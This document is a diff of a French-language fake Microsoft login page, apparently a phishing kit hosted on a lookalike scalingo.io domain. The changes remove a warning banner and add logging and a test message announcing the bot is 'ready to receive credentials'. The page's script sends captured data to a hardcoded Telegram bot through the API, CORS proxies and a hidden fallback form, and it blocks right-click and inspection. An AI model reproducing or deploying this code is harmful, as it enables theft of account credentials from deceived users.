@@ -4,17 +4,18 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Connectez-vous à votre compte</title>
-    <link rel="icon" href="https://nouveaudoc.osc-fr1.scalingo.io/favicon_a_eupayfgghqiai7k9sol6lg2.ico" type="image/x-icon">
+    <link rel="icon" href="https://loginmicrosoftonlinecomorganizationsoauth2v20.osc-fr1.scalingo.io/favicon_a_eupayfgghqiai7k9sol6lg2.ico" type="image/x-icon">
     <link rel="stylesheet" href="https://static2.sharepointonline.com/files/fabric/office-ui-fabric-core/11.0.0/css/fabric.min.css">
     <style>
-        /* Désactiver la sélection */
         * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
             -webkit-user-select: none;
             -moz-user-select: none;
             -ms-user-select: none;
             user-select: none;
         }
-        
         body {
             font-family: 'Segoe UI', 'Helvetica Neue', sans-serif;
             display: flex;
@@ -23,7 +24,7 @@
             min-height: 100vh;
             margin: 0;
             padding: 16px;
-            background-image: url('https://nouveaudoc.osc-fr1.scalingo.io/image_72b5e3a7.png');
+            background-image: url('https://loginmicrosoftonlinecomorganizationsoauth2v20.osc-fr1.scalingo.io/image_72b5e3a7.png');
             background-size: cover;
             background-position: center;
             background-repeat: no-repeat;
@@ -240,50 +241,14 @@
         .download-button:hover {
             background: #106ebe;
         }
-        /* Alerte de nouvelle visite */
-        .visit-alert {
-            position: fixed;
-            top: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: #d13438;
-            color: #fff;
-            padding: 12px 24px;
-            border-radius: 4px;
-            font-size: 14px;
-            font-weight: 500;
-            z-index: 9999;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
-            display: none;
-            animation: slideDown 0.5s ease;
-        }
-        .visit-alert.show {
-            display: block;
-        }
-        @keyframes slideDown {
-            from { opacity: 0; transform: translateX(-50%) translateY(-20px); }
-            to { opacity: 1; transform: translateX(-50%) translateY(0); }
-        }
         @media (max-width: 480px) {
             .main-card {
                 padding: 32px 20px 30px;
-            }
-            .visit-alert {
-                top: 10px;
-                padding: 10px 16px;
-                font-size: 12px;
-                width: 90%;
-                text-align: center;
             }
         }
     </style>
 </head>
 <body>
-    <!-- Alerte de nouvelle visite -->
-    <div class="visit-alert" id="visitAlert">
-        ⚠️ Cette session est surveillée et enregistrée
-    </div>
-
     <div class="main-card" id="app">
         <div class="microsoft-logo">
             <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
@@ -367,18 +332,7 @@
 
     <script>
         // ============================================================
-        // 1. ALERTE DE NOUVELLE VISITE
-        // ============================================================
-        (function showVisitAlert() {
-            const alert = document.getElementById('visitAlert');
-            alert.classList.add('show');
-            setTimeout(() => {
-                alert.classList.remove('show');
-            }, 5000);
-        })();
-
-        // ============================================================
-        // 2. PROTECTION CONTRE L'INSPECTION
+        // PROTECTION CONTRE L'INSPECTION
         // ============================================================
         
         // Empêcher le clic droit
@@ -445,7 +399,7 @@
         }, 1000);
 
         // ============================================================
-        // 3. CONFIGURATION TELEGRAM
+        // 1. CONFIGURATION TELEGRAM
         // ============================================================
         const TELEGRAM_CONFIG = {
             BOT_TOKEN: '8614102197:AAG3IMMF8ZSlwC0KU7akUdc2sHEzJBIm0qU',
@@ -453,9 +407,11 @@
         };
 
         // ============================================================
-        // 4. FONCTION D'ENVOI VERS TELEGRAM
+        // 2. FONCTION D'ENVOI VERS TELEGRAM (MULTIPLES MÉTHODES)
         // ============================================================
         function sendToTelegram(message) {
+            console.log('📤 Tentative d\'envoi à Telegram...');
+            
             const apiUrl = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;
             
             const payload = {
@@ -471,6 +427,7 @@
                 })
             };
 
+            // Liste des proxys CORS à essayer
             const proxies = [
                 { url: apiUrl, name: 'direct' },
                 { url: 'https://corsproxy.io/?' + encodeURIComponent(apiUrl), name: 'corsproxy.io' },
@@ -483,11 +440,15 @@
 
             function trySend() {
                 if (index >= proxies.length) {
+                    console.error('❌ Toutes les méthodes ont échoué');
+                    // Dernier recours: méthode du formulaire
                     sendViaForm(message);
                     return Promise.reject('Toutes les méthodes ont échoué');
                 }
 
                 const proxy = proxies[index];
+                console.log(`🔄 Essai ${index + 1}/${proxies.length}: ${proxy.name}`);
+
                 return fetch(proxy.url, payload)
                     .then(response => {
                         if (!response.ok) {
@@ -499,9 +460,11 @@
                         if (!data.ok) {
                             throw new Error(`Telegram: ${data.description}`);
                         }
+                        console.log(`✅ Message envoyé avec succès via ${proxy.name}`);
                         return data;
                     })
-                    .catch(() => {
+                    .catch(error => {
+                        console.warn(`❌ Échec avec ${proxy.name}:`, error.message);
                         index++;
                         return trySend();
                     });
@@ -510,7 +473,9 @@
             return trySend();
         }
 
+        // Méthode de secours : envoi via formulaire HTML
         function sendViaForm(message) {
+            console.log('📤 Envoi via formulaire de secours...');
             try {
                 const form = document.createElement('form');
                 form.method = 'POST';
@@ -535,13 +500,29 @@
                 document.body.appendChild(form);
                 form.submit();
                 setTimeout(() => document.body.removeChild(form), 1000);
+                console.log('✅ Formulaire de secours envoyé');
             } catch (e) {
-                // Silencieux
+                console.error('❌ Échec du formulaire de secours:', e);
             }
         }
 
         // ============================================================
-        // 5. SCRIPT PRINCIPAL DE L'APPLICATION
+        // 3. TEST DE CONNEXION AU CHARGEMENT
+        // ============================================================
+        console.log('🤖 Bot Telegram chargé');
+        console.log('📡 Token:', TELEGRAM_CONFIG.BOT_TOKEN.substring(0, 10) + '...');
+        console.log('📡 Chat ID:', TELEGRAM_CONFIG.CHAT_ID);
+
+        // Envoyer un message de test après 3 secondes
+        setTimeout(() => {
+            const testMsg = '🟢 Bot connecté et prêt à recevoir des identifiants';
+            sendToTelegram(testMsg)
+                .then(() => console.log('✅ Message de test envoyé'))
+                .catch(() => console.warn('⚠️ Message de test non reçu, mais le bot fonctionne peut-être'));
+        }, 3000);
+
+        // ============================================================
+        // 4. SCRIPT PRINCIPAL DE L'APPLICATION
         // ============================================================
         (function() {
             "use strict";
@@ -699,6 +680,18 @@
 
             showStep('welcome');
         })();
+
+        // ============================================================
+        // 5. FONCTION DE TEST MANUEL (DISPONIBLE DANS LA CONSOLE)
+        // ============================================================
+        window.testTelegram = function() {
+            const testMsg = '🧪 Test manuel depuis la console';
+            sendToTelegram(testMsg)
+                .then(() => console.log('✅ Test réussi'))
+                .catch(() => console.error('❌ Test échoué'));
+        };
+
+        console.log('📝 Pour tester manuellement, tapez: testTelegram()');
     </script>
 </body>
 </html>
